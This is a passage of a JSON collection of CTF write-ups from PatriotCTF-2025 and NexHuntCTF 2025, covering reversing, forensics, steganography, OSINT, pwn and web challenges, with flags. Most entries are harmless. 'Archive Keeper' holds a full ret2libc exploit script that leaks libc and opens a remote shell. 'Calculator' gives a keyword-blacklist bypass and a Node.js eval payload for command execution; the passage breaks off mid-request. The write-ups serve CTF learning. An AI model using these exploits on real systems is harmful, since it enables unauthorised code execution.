                "writeup": "<p>The challenge is a Rust program that takes a 32-byte string as input, applies a series of six transformations to it, and compares the result to a hardcoded target value. To find the flag, we must reverse these transformations, starting from the target value, to recover the original input.</p>\n<p>The script <code>main.rs</code> helpfully describes each transformation and notes that they are all bijections, meaning they are all reversible.</p>\n<p>The transformations are applied in this order:</p>\n<ol>\n<li><code>apply_quantum_cipher_v2</code>: XORs bytes with a 5-byte rotating key.</li>\n<li><code>apply_stellar_rotation</code>: Rotates bytes left based on their position.</li>\n<li><code>apply_spatial_transposition</code>: Swaps adjacent byte pairs.</li>\n<li><code>apply_gravitational_shift_v2</code>: Subtracts a constant from each byte.</li>\n<li><code>apply_temporal_inversion</code>: Reverses bytes in 5-byte chunks.</li>\n<li><code>apply_coordinate_calibration_v2</code>: XORs each byte with its index squared.</li>\n</ol>\n<p>To solve the challenge, we must apply the inverse of these operations in the reverse order (6 down to 1) to the <code>TARGET</code> array.</p>\n<p>The inverse operations are:</p>\n<ol>\n<li><strong>Reverse Coordinate Calibration</strong>: XOR is its own inverse, so we XOR each byte with its index squared.</li>\n<li><strong>Reverse Temporal Inversion</strong>: Reversing is its own inverse, so we reverse the bytes in 5-byte chunks again.</li>\n<li><strong>Reverse Gravitational Shift</strong>: The inverse of subtraction is addition. We add the <code>MAGIC_SUB</code> constant to each byte.</li>\n<li><strong>Reverse Spatial Transposition</strong>: Swapping is its own inverse. We swap adjacent pairs again.</li>\n<li><strong>Reverse Stellar Rotation</strong>: The inverse of a left rotation is a right rotation. We rotate each byte right by the same amount it was rotated left.</li>\n<li><strong>Reverse Quantum Cipher</strong>: XOR is its own inverse. We XOR each byte with the corresponding key byte again.</li>\n</ol>\n<p>A solver program was created (<code>solve.rs</code>) that contained the <code>TARGET</code> data and the inverse functions. Running this program decrypts the <code>TARGET</code> array and prints the flag.</p>\n<p>Flag: PCTF{Y0U_F0UND_TH3_P1R4T3_B00TY} [[PatriotCTF-2025]]</p>"
            },
            {
                "id": "space-pirates-3",
                "title": "Space Pirates-3",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse"
                ],
                "writeup": "<p>This writeup explains how to solve the \"Space Pirates 3\" CTF challenge.</p>\n<p>The challenge is a Go program that takes a 30-character string as input and encrypts it through a series of six operations. The goal is to find the input string that produces a specific target hash.</p>\n<p>The six operations are:</p>\n<ol>\n<li><code>applyUltimateQuantumCipher</code>: XORs the input with a 7-byte key.</li>\n<li><code>applyStellarRotationV2</code>: Rotates each byte to the left by a specific amount based on its position.</li>\n<li><code>applySpatialTransposition</code>: Swaps every two adjacent bytes.</li>\n<li><code>applyGravitationalShiftV3</code>: Subtracts a constant value from each byte.</li>\n<li><code>applyTemporalInversionV2</code>: Reverses the order of the bytes in 6-byte chunks.</li>\n<li><code>applyCoordinateCalibrationV3</code>: XORs each byte with a value derived from its position in the string.</li>\n</ol>\n<p>To solve the challenge, we need to reverse these operations in the reverse order they were applied. This means starting with the target hash and applying the inverse of each operation, from step 6 back to step 1.</p>\n<p>The inverse operations are:</p>\n<ol>\n<li><code>reverseCoordinateCalibrationV3</code>: XOR each byte with the same position-derived value. This is the same as the original operation, as XOR is its own inverse.</li>\n<li><code>reverseTemporalInversionV2</code>: Reverse the bytes in 6-byte chunks again. This is also the same as the original operation.</li>\n<li><code>reverseGravitationalShiftV3</code>: Add the constant value to each byte.</li>\n<li><code>reverseSpatialTransposition</code>: Swap every two adjacent bytes again. This is the same as the original operation.</li>\n<li><code>reverseStellarRotationV2</code>: Rotate each byte to the right by the same amount.</li>\n<li><code>reverseUltimateQuantumCipher</code>: XOR the input with the same 7-byte key.</li>\n</ol>\n<p>By applying these inverse operations to the target hash, we can recover the original input string, which is the flag.</p>\n<p>The following Go program implements this logic:</p>\n<pre><code class=\"go\">\npackage main\n\n\n\nimport \"fmt\"\n\n\n\n// The target encrypted vault combination (what we want the transformed input to become)\n\nvar target = [30]byte{\n\n\t0x60, 0x6D, 0x5D, 0x97, 0x2C, 0x04, 0xAF, 0x7C, 0xE2, 0x9E, 0x77, 0x85, 0xD1, 0x0F, 0x1D, 0x17, 0xD4, 0x30, 0xB7, 0x48, 0xDC, 0x48, 0x36, 0xC1, 0xCA, 0x28, 0xE1, 0x37, 0x58, 0x0F,\n\n}\n\n\n\n// The Pirate King's ULTIMATE XOR key (7 bytes - prime number for better mixing!)\n\nvar xorKey = [7]byte{0xC7, 0x2E, 0x89, 0x51, 0xB4, 0x6D, 0x1F}\n\n\n\n// NEW: Rotation pattern (8 bytes, includes rotation by 0 which is identity)\n\nvar rotationPattern = [8]uint{7, 5, 3, 1, 6, 4, 2, 0}\n\n\n\n// The Pirate King's subtraction constant (much larger than before!)\n\nconst magicSub byte = 0x93\n\n\n\n// Chunk size for reversal (changed from 5 to 6!)\n\nconst chunkSize = 6\n\n\n\n// rotateRight rotates a byte right by n positions (inverse of rotateLeft)\n\nfunc rotateRight(b byte, n uint) byte {\n\n\tn = n % 8 // Ensure n is in range [0,7]\n\n\treturn (b &gt;&gt; n) | (b &lt;&lt; (8 - n))\n\n}\n\n\n\n// Inverse of OPERATION 6: applyCoordinateCalibrationV3\n\nfunc reverseCoordinateCalibrationV3(buffer []byte) {\n\n\tfor i := range buffer {\n\n\t\tpositionValue := ((i * i) + i) % 256\n\n\t\tbuffer[i] ^= byte(positionValue)\n\n\t}\n\n}\n\n\n\n// Inverse of OPERATION 5: applyTemporalInversionV2\n\nfunc reverseTemporalInversionV2(buffer []byte) {\n\n\tfor chunkStart := 0; chunkStart &lt; len(buffer); chunkStart += chunkSize {\n\n\t\tchunkEnd := chunkStart + chunkSize\n\n\t\tif chunkEnd &gt; len(buffer) {\n\n\t\t\tchunkEnd = len(buffer)\n\n\t\t}\n\n\t\tfor i, j := chunkStart, chunkEnd-1; i &lt; j; i, j = i+1, j-1 {\n\n\t\t\tbuffer[i], buffer[j] = buffer[j], buffer[i]\n\n\t\t}\n\n\t}\n\n}\n\n\n\n// Inverse of OPERATION 4: applyGravitationalShiftV3\n\nfunc reverseGravitationalShiftV3(buffer []byte) {\n\n\tfor i := range buffer {\n\n\t\tbuffer[i] += magicSub\n\n\t}\n\n}\n\n\n\n// Inverse of OPERATION 3: applySpatialTransposition\n\nfunc reverseSpatialTransposition(buffer []byte) {\n\n\tfor i := 0; i &lt; len(buffer)-1; i += 2 {\n\n\t\tbuffer[i], buffer[i+1] = buffer[i+1], buffer[i]\n\n\t}\n\n}\n\n\n\n// Inverse of OPERATION 2: applyStellarRotationV2\n\nfunc reverseStellarRotationV2(buffer []byte) {\n\n\tfor i := range buffer {\n\n\t\trotation := rotationPattern[i%len(rotationPattern)]\n\n\t\tbuffer[i] = rotateRight(buffer[i], rotation)\n\n\t}\n\n}\n\n\n\n// Inverse of OPERATION 1: applyUltimateQuantumCipher\n\nfunc reverseUltimateQuantumCipher(buffer []byte) {\n\n\tfor i := range buffer {\n\n\t\tbuffer[i] ^= xorKey[i%len(xorKey)]\n\n\t}\n\n}\n\n\n\nfunc main() {\n\n\tbuffer := target[:]\n\n\n\n\t// Apply inverse operations in reverse order\n\n\treverseCoordinateCalibrationV3(buffer)\n\n\treverseTemporalInversionV2(buffer)\n\n\treverseGravitationalShiftV3(buffer)\n\n\treverseSpatialTransposition(buffer)\n\n\treverseStellarRotationV2(buffer)\n\n\treverseUltimateQuantumCipher(buffer)\n\n\n\n\tfmt.Printf(\"Found flag: %s\\n\", string(buffer))\n\n}\n\n</code></pre>\n<p>Running this program will print the flag:</p>\n<pre><code class=\"\">\nPCTF{M4ST3R_0F_TH3_S3V3N_S34S}\n\n</code></pre>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "vorpal-masters",
                "title": "Vorpal Masters",
                "category": "Reverse Engineering",
                "tags": [
                    "reverse"
                ],
                "writeup": "<h3>\ud83d\udd0d Challenge Summary</h3>\n<p>We are given a binary that prompts the user for a license key using the format:</p>\n<p><code>xxxx-xxxx-xxxxxxxxxx</code></p>\n<p>Our objective is to reverse engineer the binary, determine the validation logic, and generate a valid license key.</p>\n<p>---</p>\n<h3>\ud83e\udde9 Program Analysis</h3>\n<p>The key input is parsed using:</p>\n<p><code>scanf(\"%4s-%d-%10s\", &amp;local_11, &amp;local_20, local_1c);</code></p>\n<p>The key is split into:</p>\n<p>|Segment|Content Type|Target Variable| |---|---|---| |First|4 characters|local_11 \u2026 local_e| |Second|Integer|local_20| |Third|10 characters|local_1c|</p>\n<p>---</p>\n<h3>1\ufe0f\u20e3 First Segment Validation</h3>\n<p>The binary checks:</p>\n<p><code>if(local_11 != 'C' || local_f != 'C' || local_e != 'I' || local_10 != 'A')     womp_womp();</code></p>\n<p>Due to structure layout, the correct order of the first 4 characters is:</p>\n<p><code>CACI</code></p>\n<p>\u2714 Required first segment \u21d2 <code>CACI</code></p>\n<p>---</p>\n<h3>2\ufe0f\u20e3 Second Segment Validation</h3>\n<p>Must be in range:</p>\n<p><code>-5000 &lt; local_20 &lt; 10000</code></p>\n<p>and satisfy:</p>\n<p><code>(local_20 + 22) % 1738 == (((local_20 * 2) % 2000) * 6) + 9</code></p>\n<p>We brute-forced all valid values in the range and found <strong>exactly one solution</strong>:</p>\n<p><code>local_20 = 2025</code></p>\n<p>\u2714 Required middle number \u21d2 <code>2025</code></p>\n<p>---</p>\n<h3>3\ufe0f\u20e3 Third Segment Validation</h3>\n<p>The string must match exactly:</p>\n<p><code>strcmp(local_1c, \"PatriotCTF\") == 0</code></p>\n<p>\u2714 Required last segment \u21d2 <code>PatriotCTF</code></p>\n<p>---</p>\n<h3>\ud83c\udfaf Final Valid License Key</h3>\n<p><code>CACI-2025-PatriotCTF</code></p>\n<p>Entering this into the program yields:</p>\n<p><code>License key registered, you may play the game now!</code></p>\n<p>---</p>\n<h3>\ud83c\udfc1 Conclusion</h3>\n<p>By reversing the validation checks and solving a modular arithmetic constraint, we successfully obtained the only valid key:</p>\n<p>> <strong>CACI{CACI-2025-PatriotCTF}</strong></p>\n<p>Challenge solved \ud83d\ude80 [[PatriotCTF-2025]]</p>"
            },
            {
                "id": "waldo's-adventures",
                "title": "Waldo's Adventures",
                "category": "OSINT",
                "tags": [],
                "writeup": "<p>pctf{Thompson_Hall}</p>\n<p>Waldo-3 pctf{Center_for_the_Arts_Concert_Hall}</p>\n<p>Waldo-1 pctf{Horizon_Hall}</p>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "word-sea-adventures",
                "title": "Word Sea Adventures",
                "category": "Forensics",
                "tags": [
                    "steg",
                    "image"
                ],
                "writeup": "<p>The challenge is a docx file. A docx file is a zip archive. Unzip the file using <code>unzip word_sea_adventures.docx -d word_sea_adventures</code>.</p>\n<p>This extracts the contents of the docx file into a directory named <code>word_sea_adventures</code>. Inside this directory, we find several files, including images and XML files.</p>\n<p>The <code>document.xml</code> file contains a hint: \"Word documents share a similar secret: although they appear as a single file, they are really like little 'zipped-up' bottles of fun.\" This confirms that we are on the right track by unzipping the file.</p>\n<p>We then use the <code>steghide</code> tool to check for hidden data in the image files. <code>steghide extract -sf word_sea_adventures/crab.jpg</code> extracts a file named <code>decoy2.txt</code>. The content of <code>decoy2.txt</code> is \"Mr Crabs heard that his cashier may be hiding some money and maybe a flag somewhere.\"</p>\n<p>This hint points to the cashier of the Krusty Krab, who is Squidward. We then use <code>steghide</code> on the <code>squid.jpg</code> file: <code>steghide extract -sf word_sea_adventures/squid.jpg</code></p>\n<p>This extracts a file named <code>flag.txt</code>. The content of <code>flag.txt</code> is: I guess you found handsome squidward... even his looks can't hide the flag. tctf{w0rD_f1le5_ar3_als0_z1p}</p>\n<p>[[PatriotCTF-2025]]</p>"
            }
        ]
    },
    "NexHuntCTF 2025": {
        "rank": "N/A",
        "description": "Latest competition writeups.",
        "challenges": [
            {
                "id": "allo",
                "title": "Allo",
                "category": "Miscellaneous",
                "tags": [
                    "rsa",
                    "http",
                    "forensics",
                    "pcap",
                    "shark"
                ],
                "writeup": "<h3>Initial Analysis</h3>\n<p>The challenge provided a single file, <code>capture.pcapng</code>, indicating a network forensics task. First, I used <code>tshark</code> to get an overview of the TCP conversations:</p>\n<pre><code class=\"bash\">\ntshark -r capture.pcapng -z conv,tcp -q\n\n</code></pre>\n<p>This revealed several TCP connections, primarily on port 443 (HTTPS) and one on port 80 (HTTP).</p>\n<h3>HTTP/HTTPS Traffic Analysis</h3>\n<p>I first investigated the HTTP traffic, as it's typically unencrypted.</p>\n<pre><code class=\"bash\">\ntshark -r capture.pcapng -Y \"http\" -V\n\n</code></pre>\n<p>The HTTP traffic consisted of a GET request to <code>connectivity-check.ubuntu.com./</code> and a <code>204 No Content</code> response, indicating a routine system connectivity check rather than data containing the flag.</p>\n<p>The HTTPS traffic was mostly directed to Microsoft update servers (<code>slscr.update.microsoft.com</code>, <code>fe3cr.delivery.mp.microsoft.com</code>), as identified by TLS SNI:</p>\n<pre><code class=\"bash\">\ntshark -r capture.pcapng -Y \"ssl.handshake.type == 1\" -T fields -e ssl.handshake.extensions_server_name\n\n</code></pre>\n<p>Since HTTPS traffic is encrypted and decryption keys were not provided, this path was unlikely to directly yield the flag.</p>\n<h3>Protocol Hierarchy Analysis - Identifying VoIP Traffic</h3>\n<p>To uncover other potential sources of information, I examined the overall protocol distribution:</p>\n<pre><code class=\"bash\">\ntshark -r capture.pcapng -q -z io,phs\n\n</code></pre>\n<p>This command revealed a significant amount of UDP traffic, specifically RTP (Real-time Transport Protocol) and SIP (Session Initiation Protocol). The presence of both RTP and SIP strongly suggested Voice over IP (VoIP) communication.</p>\n<h3>RTP Stream Identification</h3>\n<p>Given the VoIP indication, the next step was to identify and analyze the RTP streams, which carry the audio data.</p>\n<pre><code class=\"bash\">\ntshark -r capture.pcapng -q -z rtp,streams\n\n</code></pre>\n<p>This command listed several RTP streams, all using the <code>g711U</code> (G.711 U-law) audio codec, a common codec for VoIP.</p>\n<h3>RTP Stream Extraction and Conversion</h3>\n<p>The goal was to extract the audio from each RTP stream. Initially, I attempted to use <code>tshark -z rtp,export</code>, but this option was not supported in the CLI environment.</p>\n<p>The revised strategy involved a two-step process for each RTP stream:</p>\n<ol>\n<li><strong>Extract raw RTP payload as hexadecimal</strong>: Using <code>tshark</code> to filter for specific RTP streams (identified by IP addresses and UDP ports) and output the <code>rtp.payload</code> field. This output was then piped to <code>xxd -r -p</code> to convert the hexadecimal string into raw binary data.</li>\n</ol>\n<p>``<code>bash     tshark -r capture.pcapng -Y \"rtp and ip.src==&lt;src_ip&gt; and udp.srcport==&lt;src_port&gt; and ip.dst==&lt;dst_ip&gt; and udp.dstport==&lt;dst_port&gt;\" -T fields -e rtp.payload | xxd -r -p &gt; rtp_stream_X_payload.raw     </code>``</p>\n<ol>\n<li><strong>Convert raw G.711 U-law audio to WAV</strong>: The raw binary payload was then converted to a playable WAV file using <code>sox</code>. The correct <code>sox</code> parameters for G.711 U-law (mu-law in <code>sox</code> terminology) are <code>-t raw -e mu-law -r 8000 -c 1</code>.</li>\n</ol>\n<p>``<code>bash     sox -t raw -e mu-law -r 8000 -c 1 rtp_stream_X_payload.raw rtp_stream_X.wav     </code>``</p>\n<p>This process was repeated for all identified RTP streams, resulting in <code>rtp_stream_0.wav</code> through <code>rtp_stream_5.wav</code>.</p>\n<h3>Flag Discovery</h3>\n<p>Upon listening to the generated WAV files, the flag was found in <code>rtp_stream_0.wav</code>.</p>\n<p><strong>Flag: <code>nexus{1337483127*$}</code></strong></p>"
            },
            {
                "id": "archive-keeper",
                "title": "Archive Keeper",
                "category": "Miscellaneous",
                "tags": [
                    "pwn",
                    "buffer",
                    "overflow",
                    "shellcode",
                    "rop",
                    "ret2libc",
                    "stack",
                    "assembly",
                    "memory"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>We were provided with three files:</p>\n<ul>\n<li><code>chall</code>: The vulnerable 64-bit ELF binary.</li>\n</ul>\n<ul>\n<li><code>libc.so.6</code>: The C standard library used on the server (identified as GLIBC 2.41).</li>\n</ul>\n<ul>\n<li><code>ld-linux-x86-64.so.2</code>: The dynamic linker for the environment.</li>\n</ul>\n<p>The objective was to exploit the binary on a remote server to gain a shell and read the flag.</p>\n<h3>2. Initial Analysis</h3>\n<h4>Checksec</h4>\n<p>Running <code>checksec</code> on the binary revealed the security protections:</p>\n<ul>\n<li><strong>Arch:</strong> amd64-64-little</li>\n</ul>\n<ul>\n<li><strong>RELRO:</strong> Partial RELRO (GOT is writable)</li>\n</ul>\n<ul>\n<li><strong>Stack:</strong> No canary found (Vulnerable to buffer overflow)</li>\n</ul>\n<ul>\n<li><strong>NX:</strong> NX enabled (Cannot execute shellcode on the stack)</li>\n</ul>\n<ul>\n<li><strong>PIE:</strong> No PIE (Code addresses are static)</li>\n</ul>\n<h4>Disassembly & Debugging</h4>\n<p>The binary contained a function <code>vuln</code> (called by <code>main</code>) that requested user input.</p>\n<ul>\n<li><strong>Vulnerability:</strong> The program used <code>read</code> to take input into a buffer but allowed reading more bytes than the buffer could hold, leading to a buffer overflow.</li>\n</ul>\n<ul>\n<li><strong>Offset:</strong> Using a cyclic pattern in GDB, we determined the crash offset (Instruction Pointer overwrite) was <strong>72 bytes</strong>.</li>\n</ul>\n<p>We also found a helper function <code>useless_gadget</code>, which contained a <code>pop rdi; ret</code> gadget, essential for passing arguments in 64-bit ROP chains.</p>\n<h3>3. Exploitation Strategy: Ret2Libc</h3>\n<p>Since <strong>NX</strong> is enabled, we cannot execute code on the stack. Since <strong>ASLR</strong> is likely enabled on the remote server, we cannot jump directly to <code>system()</code> because its address changes every run.</p>\n<p>We used a standard <strong>Return-to-Libc</strong> attack with a two-stage ROP chain:</p>\n<h4>Stage 1: Leak Libc Address</h4>\n<ol>\n<li><strong>Padding:</strong> Fill the buffer with 72 bytes of junk.</li>\n</ol>\n<ol>\n<li><strong>Align Stack:</strong> Add a <code>ret</code> gadget. This ensures the stack is 16-byte aligned before calling functions, preventing crashes with <code>movaps</code> instructions in newer GLIBC versions.</li>\n</ol>\n<ol>\n<li><strong>Pop RDI:</strong> Pop the address of <code>puts@got</code> into the <code>RDI</code> register (the first argument register).</li>\n</ol>\n<ol>\n<li><strong>Call Puts:</strong> Call <code>puts@plt</code>. This prints the actual memory address of <code>puts</code> from the Global Offset Table (GOT).</li>\n</ol>\n<ol>\n<li><strong>Return to Main:</strong> Jump back to <code>main</code> so the program doesn't crash, allowing us to send a second payload.</li>\n</ol>\n<h4>Stage 2: Get Shell</h4>\n<ol>\n<li><strong>Calculate Base:</strong> Subtract the static offset of <code>puts</code> from the leaked address to find the <strong>Libc Base Address</strong>.</li>\n</ol>\n<ol>\n<li><strong>Find Targets:</strong> Calculate the real addresses of <code>system()</code> and the string <code>\"/bin/sh\"</code> using the base.</li>\n</ol>\n<ol>\n<li><strong>Payload:</strong></li>\n</ol>\n<ul>\n<li>Padding (72 bytes).</li>\n</ul>\n<ul>\n<li><code>pop rdi; ret</code> gadget.</li>\n</ul>\n<ul>\n<li>Address of <code>\"/bin/sh\"</code>.</li>\n</ul>\n<ul>\n<li>Address of <code>system()</code>.</li>\n</ul>\n<h3>4. The Exploit Script</h3>\n<p>Python</p>\n<pre><code class=\"\">\nfrom pwn import *\n\n\n\n# Set up binaries\n\nbinary_path = './chall'\n\nlibc_path = './libc.so.6'\n\nld_path = './ld-linux-x86-64.so.2'\n\n\n\nelf = ELF(binary_path)\n\nlibc = ELF(libc_path)\n\ncontext.binary = elf\n\n\n\n# --- CONFIGURATION ---\n\np = remote('ctf.nexus-security.club', 2711)\n\nOFFSET = 72\n\n\n\n# --- GADGETS ---\n\ntry:\n\n    rop = ROP(elf)\n\n    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n\n    ret_gadget = rop.find_gadget(['ret'])[0] # Used for stack alignment\n\nexcept:\n\n    log.error(\"Gadget lookup failed\")\n\n\n\nlog.info(f\"Pop RDI gadget: {hex(pop_rdi)}\")\n\n\n\n# --- STAGE 1: LEAK LIBC ---\n\nlog.info(\"Sending Stage 1 Payload (Leak puts)...\")\n\n\n\npayload1 = flat(\n\n    b\"A\" * OFFSET,\n\n    ret_gadget,         # Align stack (16-byte alignment)\n\n    pop_rdi,\n\n    elf.got['puts'],    # Arg 1: GOT entry of puts\n\n    elf.plt['puts'],    # Function: puts()\n\n    elf.symbols['main'] # Return to main\n\n)\n\n\n\n# Handle remote buffering (consume prompt)\n\np.recvuntil(b\"data:\") \n\ntry:\n\n    p.recv(1) # Clear potential newline\n\nexcept:\n\n    pass\n\n\n\np.sendline(payload1)\n\n\n\n# Read the leaked address\n\ntry:\n\n    leak_raw = p.recvline().strip()\n\n    leak = u64(leak_raw.ljust(8, b\"\\x00\"))\n\n    log.success(f\"Leaked puts: {hex(leak)}\")\n\nexcept EOFError:\n\n    log.error(\"Remote closed connection.\")\n\n\n\n# Calculate Libc Base\n\nlibc.address = leak - libc.symbols['puts']\n\nlog.success(f\"Libc Base: {hex(libc.address)}\")\n\n\n\n# --- STAGE 2: GET SHELL ---\n\nlog.info(\"Sending Stage 2 Payload (system('/bin/sh'))...\")\n\n\n\nbin_sh = next(libc.search(b\"/bin/sh\"))\n\nsystem = libc.symbols['system']\n\n\n\n# Note: We removed the extra ret_gadget here to maintain alignment \n\n# for the system() call, based on the Stage 1 state.\n\npayload2 = flat(\n\n    b\"A\" * OFFSET,\n\n    pop_rdi,\n\n    bin_sh,\n\n    system\n\n)\n\n\n\n# Consume the \"Welcome...\" output from the restart\n\np.recvuntil(b\"data:\") \n\np.sendline(payload2)\n\n\n\n# Interactive Shell\n\np.interactive()\n\n</code></pre>\n<h3>5. Execution Output</h3>\n<p>Plaintext</p>\n<pre><code class=\"\">\n[+] Opening connection to ctf.nexus-security.club on port 2711: Done\n\n[*] Loaded 6 cached gadgets for './chall'\n\n[*] Pop RDI gadget: 0x40114a\n\n[*] Sending Stage 1 Payload (Leak puts)...\n\n[+] Leaked puts: 0x7f5d727755a0\n\n[+] Libc Base: 0x7f5d726f5000\n\n[*] Sending Stage 2 Payload (system('/bin/sh'))...\n\n[*] Switching to interactive mode\n\n$ cat flag.txt\n\nnexus{B0ok_F0uND_L1BC_R3t}\n\n</code></pre>"
            },
            {
                "id": "blank",
                "title": "Blank",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<h4><strong>1. Initial Analysis</strong></h4>\n<p>We started by inspecting the binary using <code>strings</code>, which dumps all printable characters from the file.</p>\n<ul>\n<li><strong>Result:</strong> The flag was not found in the static text. This indicated that the flag is likely constructed dynamically at runtime or obfuscated to prevent simple static analysis.</li>\n</ul>\n<h4><strong>2. Dynamic Analysis (The Solution)</strong></h4>\n<p>We proceeded to run the binary with <strong><code>strace</code></strong> (System Call Tracer). This tool intercepts and records the system calls called by a process and the signals received by that process.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nstrace ./blank\n\n</code></pre>\n<p><strong>Observation:</strong> Looking at the <code>strace</code> logs, we see a series of unusual <code>write</code> system calls targeting file descriptor <strong>5</strong>:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nwrite(5, \"nexus{\", 6)                   = -1 EBADF (Bad file descriptor)\n\nwrite(5, \"th3_f\", 5)                    = -1 EBADF (Bad file descriptor)\n\nwrite(5, \"l4g_w1ll\", 8)                 = -1 EBADF (Bad file descriptor)\n\n...\n\n</code></pre>\n<p><strong>What is happening here?</strong></p>\n<ul>\n<li><strong>File Descriptors (FD):</strong> In Linux, FD <code>0</code> is Standard Input, <code>1</code> is Standard Output (your screen), and <code>2</code> is Standard Error.</li>\n</ul>\n<ul>\n<li><strong>The Trick:</strong> The challenge author deliberately wrote code to write the flag to <strong>FD 5</strong>. Since FD 5 was never opened by the program, the system call fails with <code>EBADF</code> (Bad File Descriptor) and nothing prints to the screen.</li>\n</ul>\n<ul>\n<li><strong>The Leak:</strong> Even though the <code>write</code> failed, <code>strace</code> captures the <strong>arguments</strong> passed to the system call _before_ execution. This reveals the data the program _tried_ to write.</li>\n</ul>\n<h4><strong>3. Flag Reconstruction</strong></h4>\n<p>We can simply concatenate the strings from the <code>write</code> arguments in the order they appear:</p>\n<ol>\n<li><code>nexus{</code></li>\n</ol>\n<ol>\n<li><code>th3_f</code></li>\n</ol>\n<ol>\n<li><code>l4g_w1ll</code></li>\n</ol>\n<ol>\n<li><code>_r3ve4l</code></li>\n</ol>\n<ol>\n<li><code>_1ts3l</code></li>\n</ol>\n<ol>\n<li><code>f_wh3n</code></li>\n</ol>\n<ol>\n<li><code>_y0u_</code></li>\n</ol>\n<ol>\n<li><code>st0p_</code></li>\n</ol>\n<ol>\n<li><code>look</code></li>\n</ol>\n<ol>\n<li><code>1ng}</code></li>\n</ol>\n<h4><strong>Final Flag</strong></h4>\n<p>Plaintext</p>\n<pre><code class=\"\">\nnexus{th3_fl4g_w1ll_r3ve4l_1ts3lf_wh3n_y0u_st0p_look1ng}\n\n</code></pre>"
            },
            {
                "id": "blinders",
                "title": "Blinders",
                "category": "Miscellaneous",
                "tags": [
                    "steg",
                    "image"
                ],
                "writeup": "<h3>\ud83d\udd75\ufe0f Analysis & Solution</h3>\n<h4>1. Initial Reconnaissance (<code>binwalk</code>)</h4>\n<p>The first step was to analyze the file structure to check for any embedded files or corrupted headers using <code>binwalk</code>.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nbinwalk output.png\n\n</code></pre>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nDECIMAL       HEXADECIMAL     DESCRIPTION\n\n--------------------------------------------------------------------------------\n\n0             0x0             PNG image, 1280 x 853, 8-bit/color RGBA, non-interlaced\n\n41            0x29            Zlib compressed data, default compression\n\n</code></pre>\n<p>_Observation:_ The file appears to be a valid PNG image. <code>binwalk</code> didn't immediately detect any appended files (like ZIPs or JPEGs) grafted onto the end, suggesting the data was hidden inside the image bits itself (LSB steganography) or within specific data chunks.</p>\n<h4>2. Deep Steganography Analysis (<code>zsteg</code>)</h4>\n<p>Since it was a PNG, we used <code>zsteg</code>, a tool designed to detect hidden data in PNG/BMP files by iterating through different Least Significant Bit (LSB) combinations and pixel orders. We used the <code>-a</code> flag to try all known methods.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nzsteg -a output.png\n\n</code></pre>\n<p><strong>Output:</strong> The tool successfully extracted the hidden string from the pixel data:</p>\n<p>Flag: <code>nexus{yea_u_didi_v2er_wekcj7}</code></p>"
            },
            {
                "id": "calculator",
                "title": "Calculator",
                "category": "Miscellaneous",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<p><strong>Category:</strong> Web Exploitation</p>\n<h3>Challenge Overview</h3>\n<p>We were presented with a web-based calculator. The interface allowed basic math operations, but attempting to use characters like quotes (<code>' \"</code>) or brackets (<code>[] {}</code>) triggered a \"Blocked characters detected!\" alert.</p>\n<h3>Analysis</h3>\n<h4>1. Client-Side Analysis</h4>\n<p>Reviewing the frontend JavaScript (<code>script.js</code>), I noticed the security validation was entirely client-side:</p>\n<p>JavaScript</p>\n<pre><code class=\"\">\nconst blocked = /['\"\\[\\]\\{\\}]/;\n\nif (blocked.test(expr)) {\n\n  alert(\"Blocked characters detected!\");\n\n  return;\n\n}\n\n</code></pre>\n<p>Since the validation occurs in the browser before the request is sent, it can be trivially bypassed by sending the HTTP request manually using the browser console.</p>\n<h4>2. Server-Side Analysis</h4>\n<p>After bypassing the frontend check using <code>fetch</code>, I attempted a standard Node.js Remote Code Execution (RCE) payload. However, the server responded with an error indicating a <strong>Server-Side Blacklist</strong>.</p>\n<p>The server was inspecting the input string and blocking specific keywords, including:</p>\n<ul>\n<li><code>process</code></li>\n</ul>\n<ul>\n<li><code>require</code></li>\n</ul>\n<ul>\n<li><code>constructor</code></li>\n</ul>\n<ul>\n<li><code>Function</code></li>\n</ul>\n<ul>\n<li><code>global</code></li>\n</ul>\n<p>This confirmed the backend was likely using <code>eval()</code> to process the input but was filtering \"dangerous\" words.</p>\n<h3>Exploitation</h3>\n<h4>Bypassing the Blacklist</h4>\n<p>In JavaScript, <code>eval()</code> executes code passed as a string. We can bypass keyword filters by using <strong>String Concatenation</strong>. The server looks for the exact sequence <code>\"require\"</code>, but if we write <code>\"req\" + \"uire\"</code>, the filter sees harmless strings, while the executed code sees the command.</p>\n<p>I constructed a payload to access the <code>child_process</code> module without using any blocked keywords contiguously.</p>\n<p><strong>The Strategy:</strong></p>\n<ol>\n<li><strong>Access Constructor:</strong> <code>[][\"fill\"][\"const\"+\"ructor\"]</code></li>\n</ol>\n<ol>\n<li><strong>Get Process:</strong> Create a function that returns <code>this.pro</code> + <code>cess</code>.</li>\n</ol>\n<ol>\n<li><strong>Get Require:</strong> Access <code>process[\"mainModule\"][\"req\"+\"uire\"]</code>.</li>\n</ol>\n<ol>\n<li><strong>Execute Command:</strong> Import <code>child_process</code> and run <code>execSync</code>.</li>\n</ol>\n<h4>The Final Payload</h4>\n<p>I used the browser console to send the following request, which concatenates the command <code>cat flag.txt</code> to read the flag file found during enumeration (<code>ls</code>):</p>\n<p>JavaScript</p>\n<pre><code class=\"\">\nconst payload = `\n\n  (\n\n    [][\"fill\"][\"const\"+\"ructor\"](\n\n      \"return this.pro\"+\"cess\"\n\n    )()\n\n  )\n\n  [\"mainModule\"]\n\n  [\"req\"+\"uire\"](\"chi\"+\"ld_pro\"+\"cess\")\n\n  [\"ex\"+\"ecSync\"](\"cat fl\"+\"ag.txt\").toString()\n\n`;\n\n\n\nfetch(\"/calculate\", {\n\n  method: \"POST\",\n\n  headers: { \"Content-Type\": \"application/json\" },\n\n  body: JSON.stringify({ expr: payload }),\n\n})\n\n.then(res 